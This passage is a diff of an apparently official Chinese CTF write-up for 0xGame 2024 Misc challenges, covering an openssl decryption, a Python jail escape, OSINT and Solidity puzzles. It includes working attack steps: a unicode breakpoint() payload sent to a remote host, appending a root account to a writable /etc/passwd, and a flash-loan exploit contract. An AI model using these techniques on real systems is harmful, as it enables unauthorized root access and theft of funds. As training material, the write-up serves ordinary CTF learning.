 <p>可以看到是用<code>openssl</code>对<code>unfinished_hello.php</code>进行了文件加密，且删掉了原文件，只需要用<code>openssl</code>解<code>secret.php</code>即可拿到原文件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-128-cbc -d -<span class="keyword">in</span> secret.php -out flag.php -iv 114514 -K c4d038b4bed09fdb</span><br></pre></td></tr></table></figure>
+
 <p>输出的<code>flag.php</code>文件内容为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//0xGame&#123;8552BB81-D51A-FDCE-2EF1-55EBBEFF9B9C&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="untouchable-flag">Untouchable flag</h3>
-<p>题目附件为<code>pyjail.py</code>：</p>
+
+<h3 id="Untouchable-flag"><a href="#Untouchable-flag" class="headerlink" title="Untouchable flag"></a>Untouchable flag</h3><p>题目附件为<code>pyjail.py</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pyjail</span>():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> re.findall(pattern,code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Some characters in your code are banned.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(code) &gt; <span class="number">12</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Your code is too long.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">eval</span>(code)</span><br></pre></td></tr></table></figure>
+
 <p>可以看到禁用了所有字母和数字，并且对代码长度有所限制，必须不大于12</p>
-<p>nc连上后题目还给了一个hint:<code>the Python version is greater than 3.7.</code>，网上找找可以知道python3支持非ASCII字符，可以用unicode字符绕过第一个限制，并且还可以找到从Python
-3.7开始引入了breakpoint()函数，于是可以绕过第二个限制进行rce：</p>
+<p>nc连上后题目还给了一个hint:<code>the Python version is greater than 3.7.</code>，网上找找可以知道python3支持非ASCII字符，可以用unicode字符绕过第一个限制，并且还可以找到从Python 3.7开始引入了breakpoint()函数，于是可以绕过第二个限制进行rce：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>, <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()&quot;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 <p>拿到shell后直接读flag发现不行，<code>ls- l</code>查看文件权限可以看到flag文件只有root可读，需要寻找提权的方法</p>
-<p>预期解是/etc/passwd提权，可以看到环境中该文件所有用户可读可写，直接写入一个拥有root权限的用户即可</p>
+<p>预期解是&#x2F;etc&#x2F;passwd提权，可以看到环境中该文件所有用户可读可写，直接写入一个拥有root权限的用户即可</p>
 <p>办法有很多，这里拿openssl举例：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="built_in">test</span> z9nn8w</span><br><span class="line"></span><br><span class="line">$1$<span class="built_in">test</span><span class="variable">$eicwC</span>/tivElau/ii72ooo0</span><br></pre></td></tr></table></figure>
-<p>写入/etc/passwd再切换用户即可拿到root权限：</p>
+
+<p>写入&#x2F;etc&#x2F;passwd再切换用户即可拿到root权限：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;w8nn9z:$1$test$eicwC/tivElau/ii72ooo0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">su w8nn9z</span><br><span class="line">z9nn8w</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">0xGame&#123;PyJ@i1_w1Th_P@sswd_3l3Vat3_pr1v1l3g3&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="osint">OSINT</h2>
-<h3 id="互联网的一角">互联网的一角*</h3>
-<p>访问题目页面，摁F12就可以看到前端有注释</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496038143-772e7f75-6c33-4116-b94c-c0d36f545137.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+
+<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="互联网的一角"><a href="#互联网的一角" class="headerlink" title="互联网的一角*"></a>互联网的一角*</h3><p>访问题目页面，摁F12就可以看到前端有注释</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038143-772e7f75-6c33-4116-b94c-c0d36f545137.png" alt="img"></p>
 <p>这里的注释指的是要求查询CNAME记录，后面上的hint中也给出了。查询CNAME记录的方法其实有很多，ping、nslookup、dig等等都可以，最简单的就是这里直接ping一下。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-4d8653c5-31da-4d1b-b764-63526956deee.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>对于.github.io，如果有经验的话一眼就知道这是github
-pages。如果不知道，查找一下也很快能得知，这是github上一个叫做oxg4me2024的用户搭建的页面，去github上搜索一下这个用户。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-e0196d4a-c59c-41ed-89c5-415f4634b550.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-4d8653c5-31da-4d1b-b764-63526956deee.png" alt="img"></p>
+<p>对于.github.io，如果有经验的话一眼就知道这是github pages。如果不知道，查找一下也很快能得知，这是github上一个叫做oxg4me2024的用户搭建的页面，去github上搜索一下这个用户。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038235-e0196d4a-c59c-41ed-89c5-415f4634b550.png" alt="img"></p>
 <p>一路顺藤摸瓜找进去，可以找到flag.txt</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496038439-fc672b55-e3f9-4f20-a427-05f89a278b93.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038439-fc672b55-e3f9-4f20-a427-05f89a278b93.png" alt="img"></p>
 <p>但是flag.txt的内容并不是flag，这里点击右上角的History，查询这个文件的修改历史即可看到flag</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496038352-7848d4ed-657a-46b7-8544-ab7f3a4ebc78.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039022-84e0b736-aacc-4478-909c-cd8575d148cd.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="给我干哪来了这还是国内吗">给我干哪来了，这还是国内吗？？*</h3>
-<p>图寻题，就是要求找出图片中的地方</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039163-3beb9aaf-8f2c-4881-8918-7fd3ffcc6d97.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039211-e2bccf95-0314-4cb1-b842-84e86119462c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>其实不难看出来，底下还有个google的logo没能删掉，这个地方其实可以在google
-map上找到原图。将图片放大，可以看到远处建筑物上标着的super st
-bernard，在google map上一搜就有。位置差不多在45.90°N，7.19°E左右。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039439-56cf623b-ea8f-459a-adbd-6090d85977c9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496038352-7848d4ed-657a-46b7-8544-ab7f3a4ebc78.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039022-84e0b736-aacc-4478-909c-cd8575d148cd.png" alt="img"></p>
+<h3 id="给我干哪来了，这还是国内吗？？"><a href="#给我干哪来了，这还是国内吗？？" class="headerlink" title="给我干哪来了，这还是国内吗？？*"></a>给我干哪来了，这还是国内吗？？*</h3><p>图寻题，就是要求找出图片中的地方</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039163-3beb9aaf-8f2c-4881-8918-7fd3ffcc6d97.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039211-e2bccf95-0314-4cb1-b842-84e86119462c.png" alt="img"></p>
+<p>其实不难看出来，底下还有个google的logo没能删掉，这个地方其实可以在google map上找到原图。将图片放大，可以看到远处建筑物上标着的super st bernard，在google map上一搜就有。位置差不多在45.90°N，7.19°E左右。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039439-56cf623b-ea8f-459a-adbd-6090d85977c9.png" alt="img"></p>
 <p>可以查看实景</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039766-63e8739d-7f7e-4818-bee6-5277f8aada3c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>国家是瑞士不用多说，剩下的可以在<a
-target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/瑞士城市列表">维基百科</a>上找到，改成英文即可</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496039879-b9b181ee-f9e0-4f73-90cf-101503a7bfa5.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039766-63e8739d-7f7e-4818-bee6-5277f8aada3c.png" alt="img"></p>
+<p>国家是瑞士不用多说，剩下的可以在<a target="_blank" rel="noopener external nofollow noreferrer" href="https://zh.wikipedia.org/wiki/%E7%91%9E%E5%A3%AB%E5%9F%8E%E5%B8%82%E5%88%97%E8%A1%A8">维基百科</a>上找到，改成英文即可</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496039879-b9b181ee-f9e0-4f73-90cf-101503a7bfa5.png" alt="img"></p>
 <p>0xGame{Switzerland_Valais_Entremont_Bourg-Saint-Pierre}</p>
-<h2 id="blockchain">Blockchain</h2>
-<h3 id="肘上链">肘，上链！*</h3>
-<p>出题时用的是github上的<a
-target="_blank" rel="noopener" href="https://github.com/chainflag/solidity-ctf-template/tree/401c6c470acdeada5eb64ba5bc258a85c503f43c">solidctf</a>项目，所以nc那边传完一次就断就不要拷打我了o(╥﹏╥)o</p>
+<h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="肘，上链！"><a href="#肘，上链！" class="headerlink" title="肘，上链！*"></a>肘，上链！*</h3><p>出题时用的是github上的<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/chainflag/solidity-ctf-template/tree/401c6c470acdeada5eb64ba5bc258a85c503f43c">solidctf</a>项目，所以nc那边传完一次就断就不要拷打我了o(╥﹏╥)o</p>
 <p>先nc创建账户</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912624735-18388018-e88f-4cdc-abc2-5a937e74ee03.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624735-18388018-e88f-4cdc-abc2-5a937e74ee03.png" alt="img"></p>
 <p>拿给的账号去水龙头上接一下水</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912625208-5fe4b9dc-a87c-472a-958c-84f7af5c0d25.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625208-5fe4b9dc-a87c-472a-958c-84f7af5c0d25.png" alt="img"></p>
 <p>部署题目合约</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912625378-4cda8e9b-65b0-4bcd-b269-2c7305d4f617.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625378-4cda8e9b-65b0-4bcd-b269-2c7305d4f617.png" alt="img"></p>
 <p>打开metamask（一个浏览器插件），如下图连接到RPC，其中链ID随便填一个它就会告诉你正确的链ID</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912625196-76cd899a-2417-4c10-8b2f-2a5066ee6f09.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625196-76cd899a-2417-4c10-8b2f-2a5066ee6f09.png" alt="img"></p>
 <p>切换到该网络，拿自己的账户也去水龙头上接一下水</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912625278-21646646-c154-4558-8aff-55a3795288a1.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625278-21646646-c154-4558-8aff-55a3795288a1.png" alt="img"></p>
 <p>获取一下题目合约</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912625381-4745037b-e25c-4ca7-9fe6-4b0de94d873e.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>打开<a
-target="_blank" rel="noopener" href="https://remix.ethereum.org/">remix</a>，这里新建一个文件，把题目合约复制过去</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912627380-67d425d2-0b89-41c0-9555-c662c9e0df00.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912625381-4745037b-e25c-4ca7-9fe6-4b0de94d873e.png" alt="img"></p>
+<p>打开<a target="_blank" rel="noopener external nofollow noreferrer" href="https://remix.ethereum.org/">remix</a>，这里新建一个文件，把题目合约复制过去</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627380-67d425d2-0b89-41c0-9555-c662c9e0df00.png" alt="img"></p>
 <p>选择相应的版本，编译合约</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912627784-9dbc9b55-908e-4383-bdb0-046067fba524.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>Environment中选择Injected Provider -
-MetaMask，注意metamask的小窗口要点开看一下是否连接成功</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912627408-f4fa0a7d-65bc-4daf-8b43-606569e700a4.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627784-9dbc9b55-908e-4383-bdb0-046067fba524.png" alt="img"></p>
+<p>Environment中选择Injected Provider - MetaMask，注意metamask的小窗口要点开看一下是否连接成功</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627408-f4fa0a7d-65bc-4daf-8b43-606569e700a4.png" alt="img"></p>
 <p>将前面nc时给的合约地址复制过来到At Address里面，点击At Address</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912627406-e6f814b4-2dc5-410f-9c34-a9b471e119d5.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>题目的合约代码很简单，要求传的值需要与"Hello0xBlockchain"的keccak256哈希值相同，这里用web3py计算一下。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627406-e6f814b4-2dc5-410f-9c34-a9b471e119d5.png" alt="img"></p>
+<p>题目的合约代码很简单，要求传的值需要与”Hello0xBlockchain”的keccak256哈希值相同，这里用web3py计算一下。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line">s=b&quot;Hello0xBlockchain&quot;</span><br><span class="line">w3 = Web3()</span><br><span class="line">hash_bytes = w3.keccak(s)</span><br><span class="line">hash_hex = hash_bytes.hex()</span><br><span class="line">print(hash_hex)</span><br></pre></td></tr></table></figure>
+
 <p>得到的结果复制到sign里面，前面记得加上0x，然后点击sign，中间有个交易的对话框，确认一下</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912627608-ae23158a-a906-4dcb-b3ad-8572b828b37b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912627608-ae23158a-a906-4dcb-b3ad-8572b828b37b.png" alt="img"></p>
 <p>点击isSolved，看到值已经返回了true</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912628021-d06a3d0f-311b-44e8-a3a1-b9d22c7e8a4f.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628021-d06a3d0f-311b-44e8-a3a1-b9d22c7e8a4f.png" alt="img"></p>
 <p>回到nc那边，get flag</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912628025-45d879a5-0f85-4af1-ba10-6b13b11577a3.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="theft">theft</h3>
-<p>通过在execute中执行deposit，来替代还款，从而可以达到借了就还但是自己的余额越来越多</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912628025-45d879a5-0f85-4af1-ba10-6b13b11577a3.png" alt="img"></p>
+<h3 id="theft"><a href="#theft" class="headerlink" title="theft"></a>theft</h3><p>通过在execute中执行deposit，来替代还款，从而可以达到借了就还但是自己的余额越来越多</p>
 <p>Exp:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FlashLoan &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function flashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    FlashLoan public FL;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        FL = FlashLoan(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        for(int i = 0; i &lt; 9; i++)&#123;</span><br><span class="line">            FL.flashLoan(100 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        FL.flashLoan(99 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        FL.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>先at
-address部署Setup.sol获取target地址，然后填入构造函数部署再调用attack即可</p>
-<h3 id="我哪来那么多臭钱">我哪来那么多臭钱？？*</h3>
-<p>具体的部署等操作这里就不再赘述了，详见week1的wp。</p>
+
+<p>先at address部署Setup.sol获取target地址，然后填入构造函数部署再调用attack即可</p>
+<h3 id="我哪来那么多臭钱？？"><a href="#我哪来那么多臭钱？？" class="headerlink" title="我哪来那么多臭钱？？*"></a>我哪来那么多臭钱？？*</h3><p>具体的部署等操作这里就不再赘述了，详见week1的wp。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance;</span><br><span class="line">    bool public solve;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">        require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve=true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>先来看合约代码。Get函数为初始化balance为50，check函数为检查余额是否为114514，当余额为114514时，isSolved函数返回true。</p>
 <p>主要是Transfer函数，用于向某个地址转账，但这里做了一系列的限制。要求转账金额、转账前余额、转账后余额都大于0，另外要求当前发起转账的用户地址后两位为ef。</p>
-<p>这里有两个考点，一个是整数溢出，我们可以注意到solidity版本为0.7.0，balance和amount的类型都为uint256，即数据大小在0~2**256之间。代码中有balance[msg.sender]
-- amount &gt; 0的要求，但是如果amount &gt;
-balance[msg.sender]，那么会发生什么？显然值并不会变为负数，这里值会直接变成2**256
-- amount +
-balance[msg.sender]。因此，我们只要使amount的值为2**256-114514+50即可。这里其实有些师傅是想复杂了。</p>
-<p>另外一个考点其实是虚荣地址（vanity
-address），也就是后来给的hint中所指的。虚荣地址就是用户自己生成的具有某一特殊组合的地址，google一下其实不难找到有一个在线网站https://vanity-eth.tk/可以生成虚荣地址，如下图所示。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638728-327e8e05-2164-421e-b8c2-81309a7811f7.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>但其实自己或者让GPT帮忙搓一个脚本其实也不难（出题人问GPT一次就成功了）</p>
+<p>这里有两个考点，一个是整数溢出，我们可以注意到solidity版本为0.7.0，balance和amount的类型都为uint256，即数据大小在0~2**256之间。代码中有balance[msg.sender] - amount &gt; 0的要求，但是如果amount &gt; balance[msg.sender]，那么会发生什么？显然值并不会变为负数，这里值会直接变成2**256 - amount + balance[msg.sender]。因此，我们只要使amount的值为2**256-114514+50即可。这里其实有些师傅是想复杂了。</p>
+<p>另外一个考点其实是虚荣地址（vanity address），也就是后来给的hint中所指的。虚荣地址就是用户自己生成的具有某一特殊组合的地址，google一下其实不难找到有一个在线网站<a target="_blank" rel="noopener external nofollow noreferrer" href="https://vanity-eth.tk/%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90%E8%99%9A%E8%8D%A3%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82">https://vanity-eth.tk/可以生成虚荣地址，如下图所示。</a></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638728-327e8e05-2164-421e-b8c2-81309a7811f7.png" alt="img"></p>
+<p>  但其实自己或者让GPT帮忙搓一个脚本其实也不难（出题人问GPT一次就成功了）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_address_ending_with_ef</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        private_key = <span class="string">&#x27;0x&#x27;</span> + secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">        account = Account.from_key(private_key)</span><br><span class="line">        address = account.address</span><br><span class="line">        <span class="keyword">if</span> address.endswith(<span class="string">&#x27;ef&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> private_key, address</span><br><span class="line">private_key, address = find_address_ending_with_ef()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private Key: <span class="subst">&#123;private_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>接下来导入私钥就可以用了。</p>
 <p>先get</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638944-325a6559-7d5c-4154-8f44-d22f7e27c3c7.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638944-325a6559-7d5c-4154-8f44-d22f7e27c3c7.png" alt="img"></p>
 <p>然后transact，to的地址随便填就行</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638960-23d069d1-2007-4f70-9ffb-c17ea52de29c.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638960-23d069d1-2007-4f70-9ffb-c17ea52de29c.png" alt="img"></p>
 <p>再check，可以看到isSolved返回了true</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130639090-ebecaa01-9f1c-494e-901d-6387685072fe.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639090-ebecaa01-9f1c-494e-901d-6387685072fe.png" alt="img"></p>
 <p>拿到flag</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130639424-f594014e-b307-47db-ae07-36214572457e.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h2 id="forensics">Forensics</h2>
-<h3 id="画画的baby">画画的baby</h3>
-<p>附件给了一个内存文件，本题直接用volatility2或volatility3都能完成</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130639424-f594014e-b307-47db-ae07-36214572457e.png" alt="img"></p>
